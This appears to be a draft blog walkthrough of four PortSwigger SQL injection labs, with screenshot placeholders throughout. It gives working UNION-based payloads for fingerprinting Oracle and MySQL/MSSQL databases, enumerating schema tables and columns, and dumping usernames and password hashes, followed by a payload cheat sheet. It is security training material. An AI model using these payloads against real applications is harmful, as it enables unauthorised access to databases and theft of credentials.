---
title: "PortSwigger SQL Injection Labs — Part 2: Examining the Database"
date: 2026-09-22 06:10:00 +0000
categories: [Web Penetration Testing]
tags: [SQL Injection, PortSwigger, Web Security Academy]
description: "How to fingerprint the database type and version and enumerate table and column names to dump credentials, on Oracle and non-Oracle databases."
author: Paschal Sangawe
toc: true
---

Part 2 covers the four "examining the database" labs (3–6). The pattern is always the same:

1. Find out how many columns the query returns and which of them accept text.
2. Use `UNION SELECT` to read the data you actually want (version, tables, columns, credentials).

The differences between Oracle and other databases matter, so each pair of labs shows both sides.

> **Quick note on comments:** MySQL accepts `#` or `-- ` (with a trailing space) as a comment. Oracle, PostgreSQL and Microsoft SQL Server only accept `-- `.

## Lab 3 — Database type and version on Oracle
> **Picture goes here (#1).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `'+UNION+SELECT+'abc','def'+FROM+dual--`.
> _Save as_ `images/portswigger-sqli-part-2-examining-the-database/1.png` _then replace this block with_ `![Lab 3 — Database type and version on Oracle](/images/portswigger-sqli-part-2-examining-the-database/1.png)`_._


**Difficulty:** Practitioner
**Goal:** Display the database version string.

Oracle requires every `SELECT` to specify a table, so we use the built-in `dual` table. First verify the column count and text-capable columns:

```sql
'+UNION+SELECT+'abc','def'+FROM+dual--
```

> **Picture goes here (#2).** Capture this request/response or command step in Burp/terminal. Key line: `'+UNION+SELECT+'abc','def'+FROM+dual--`.
> _Save as_ `images/portswigger-sqli-part-2-examining-the-database/2.png` _then replace this block with_ `![Lab 3 — Database type and version on Oracle](/images/portswigger-sqli-part-2-examining-the-database/2.png)`_._


The query returns two columns and the response now shows `abc` and `def`, confirming both are string-compatible. Then read the version banner:

```sql
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
```

> **Picture goes here (#3).** Capture this request/response or command step in Burp/terminal. Key line: `'+UNION+SELECT+BANNER,+NULL+FROM+v$version--`.
> _Save as_ `images/portswigger-sqli-part-2-examining-the-database/3.png` _then replace this block with_ `![Lab 3 — Database type and version on Oracle](/images/portswigger-sqli-part-2-examining-the-database/3.png)`_._


`v$version` is Oracle's built-in view listing component versions; `BANNER` holds the version text.

> **Picture goes here (#4).** Response showing the Oracle version banner (e.g. `Oracle Database 11.2.0.2.0`).
> _Save as_ `images/portswigger-sqli-part-2-examining-the-database/4.png` _then replace this block with_ `![Lab 3 — Database type and version on Oracle](/images/portswigger-sqli-part-2-examining-the-database/4.png)`_._

## Lab 4 — Database type and version on MySQL and Microsoft
> **Picture goes here (#5).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `'+UNION+SELECT+'abc','def'#`.
> _Save as_ `images/portswigger-sqli-part-2-examining-the-database/5.png` _then replace this block with_ `![Lab 4 — Database type and version on MySQL and Microsoft](/images/portswigger-sqli-part-2-examining-the-database/5.png)`_._


**Difficulty:** Practitioner
**Goal:** Display the database version string.

On MySQL and Microsoft SQL Server the version is exposed through the `@@version` global variable, and no `dual` table is needed:

```sql
'+UNION+SELECT+'abc','def'#
```

> **Picture goes here (#6).** Capture this request/response or command step in Burp/terminal. Key line: `'+UNION+SELECT+'abc','def'#`.
> _Save as_ `images/portswigger-sqli-part-2-examining-the-database/6.png` _then replace this block with_ `![Lab 4 — Database type and version on MySQL and Microsoft](/images/portswigger-sqli-part-2-examining-the-database/6.png)`_._


Then:

```sql
'+UNION+SELECT+@@version,+NULL#
```

> **Picture goes here (#7).** Capture this request/response or command step in Burp/terminal. Key line: `'+UNION+SELECT+@@version,+NULL#`.
> _Save as_ `images/portswigger-sqli-part-2-examining-the-database/7.png` _then replace this block with_ `![Lab 4 — Database type and version on MySQL and Microsoft](/images/portswigger-sqli-part-2-examining-the-database/7.png)`_._


The `#` comments out the rest of the original query (use `-- ` instead when targeting Microsoft SQL Server).

> **Picture goes here (#8).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
> _Save as_ `images/portswigger-sqli-part-2-examining-the-database/8.png` _then replace this block with_ `![Lab 4 — Database type and version on MySQL and Microsoft](/images/portswigger-sqli-part-2-examining-the-database/8.png)`_._

## Lab 5 — Listing database contents on non-Oracle databases
> **Picture goes here (#9).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `'+UNION+SELECT+'abc','def'--`.
> _Save as_ `images/portswigger-sqli-part-2-examining-the-database/9.png` _then replace this block with_ `![Lab 5 — Listing database contents on non-Oracle databases](/images/portswigger-sqli-part-2-examining-the-database/9.png)`_._


**Difficulty:** Practitioner
**Goal:** Enumerate the schema, extract credentials, and log in as `administrator`.

Most databases (MySQL, PostgreSQL, MSSQL) expose the `information_schema` views, which describe every table and column in the current database.

Confirm two text columns:

```sql
'+UNION+SELECT+'abc','def'--
```

> **Picture goes here (#10).** Capture this request/response or command step in Burp/terminal. Key line: `'+UNION+SELECT+'abc','def'--`.
> _Save as_ `images/portswigger-sqli-part-2-examining-the-database/10.png` _then replace this block with_ `![Lab 5 — Listing database contents on non-Oracle databases](/images/portswigger-sqli-part-2-examining-the-database/10.png)`_._


List the tables:

```sql
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
```

> **Picture goes here (#11).** Capture this request/response or command step in Burp/terminal. Key line: `'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`.
> _Save as_ `images/portswigger-sqli-part-2-examining-the-database/11.png` _then replace this block with_ `![Lab 5 — Listing database contents on non-Oracle databases](/images/portswigger-sqli-part-2-examining-the-database/11.png)`_._


Find the table holding credentials (the lab randomises the suffix, e.g. `users_abcdef`). List its columns:

```sql
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
```

> **Picture goes here (#12).** Capture this request/response or command step in Burp/terminal. Key line: `'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_a`.
> _Save as_ `images/portswigger-sqli-part-2-examining-the-database/12.png` _then replace this block with_ `![Lab 5 — Listing database contents on non-Oracle databases](/images/portswigger-sqli-part-2-examining-the-database/12.png)`_._


Now dump the usernames and password hashes:

```sql
'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
```

> **Picture goes here (#13).** Capture this request/response or command step in Burp/terminal. Key line: `'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--`.
> _Save as_ `images/portswigger-sqli-part-2-examining-the-database/13.png` _then replace this block with_ `![Lab 5 — Listing database contents on non-Oracle databases](/images/portswigger-sqli-part-2-examining-the-database/13.png)`_._


Identify the administrator's hash, then use the lab's password-cracking/decoding helper to recover the plaintext and log in.

> **Picture goes here (#14).** Response listing the `users_*` table columns, then the dumped credentials.
> _Save as_ `images/portswigger-sqli-part-2-examining-the-database/14.png` _then replace this block with_ `![Lab 5 — Listing database contents on non-Oracle databases](/images/portswigger-sqli-part-2-examining-the-database/14.png)`_._

**Steps**

1. Establish the column count and text columns.
2. `information_schema.tables` → find `users_*`.
3. `information_schema.columns WHERE table_name='users_*'` → find the username/password columns.
4. `UNION SELECT` those two columns to dump all credentials.
5. Log in as `administrator`.

## Lab 6 — Listing database contents on Oracle
> **Picture goes here (#15).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `'+UNION+SELECT+'abc','def'+FROM+dual--`.
> _Save as_ `images/portswigger-sqli-part-2-examining-the-database/15.png` _then replace this block with_ `![Lab 6 — Listing database contents on Oracle](/images/portswigger-sqli-part-2-examining-the-database/15.png)`_._


**Difficulty:** Practitioner
**Goal:** Same as Lab 5, but against Oracle.

Oracle's metadata lives in different views: `all_tables` and `all_tab_columns` (Oracle uppercases identifiers, so match the uppercase table name).

Confirm two text columns:

```sql
'+UNION+SELECT+'abc','def'+FROM+dual--
```

> **Picture goes here (#16).** Capture this request/response or command step in Burp/terminal. Key line: `'+UNION+SELECT+'abc','def'+FROM+dual--`.
> _Save as_ `images/portswigger-sqli-part-2-examining-the-database/16.png` _then replace this block with_ `![Lab 6 — Listing database contents on Oracle](/images/portswigger-sqli-part-2-examining-the-database/16.png)`_._


List tables:

```sql
'+UNION+SELECT+table_name,NULL+FROM+all_tables--
```

> **Picture goes here (#17).** Capture this request/response or command step in Burp/terminal. Key line: `'+UNION+SELECT+table_name,NULL+FROM+all_tables--`.
> _Save as_ `images/portswigger-sqli-part-2-examining-the-database/17.png` _then replace this block with_ `![Lab 6 — Listing database contents on Oracle](/images/portswigger-sqli-part-2-examining-the-database/17.png)`_._


Find the credentials table (`USERS_ABCDEF`) and list its columns:

```sql
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
```

> **Picture goes here (#18).** Capture this request/response or command step in Burp/terminal. Key line: `'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--`.
> _Save as_ `images/portswigger-sqli-part-2-examining-the-database/18.png` _then replace this block with_ `![Lab 6 — Listing database contents on Oracle](/images/portswigger-sqli-part-2-examining-the-database/18.png)`_._


Dump the credentials:

```sql
'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
```

> **Picture goes here (#19).** Capture this request/response or command step in Burp/terminal. Key line: `'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--`.
> _Save as_ `images/portswigger-sqli-part-2-examining-the-database/19.png` _then replace this block with_ `![Lab 6 — Listing database contents on Oracle](/images/portswigger-sqli-part-2-examining-the-database/19.png)`_._


Log in as `administrator` with the recovered password.

> **Picture goes here (#20).** Oracle `all_tables` output showing `USERS_ABCDEF`, followed by the credential dump.
> _Save as_ `images/portswigger-sqli-part-2-examining-the-database/20.png` _then replace this block with_ `![Lab 6 — Listing database contents on Oracle](/images/portswigger-sqli-part-2-examining-the-database/20.png)`_._

## Cheat sheet

| Purpose | Oracle | MySQL / MSSQL / PostgreSQL |
|---------|--------|----------------------------|
| Version | `SELECT banner FROM v$version` | `SELECT @@version` |
| Tables | `SELECT table_name FROM all_tables` | `SELECT table_name FROM information_schema.tables` |
| Columns | `SELECT column_name FROM all_tab_columns WHERE table_name='X'` | `SELECT column_name FROM information_schema.columns WHERE table_name='X'` |
| String concat | `'a'||'b'` | `CONCAT('a','b')` (or `||`) |
| Comment | `-- ` | `#` or `-- ` |

Next: [Part 3 — UNION-Based SQL Injection](/posts/portswigger-sqli-part-3-union-attacks/).
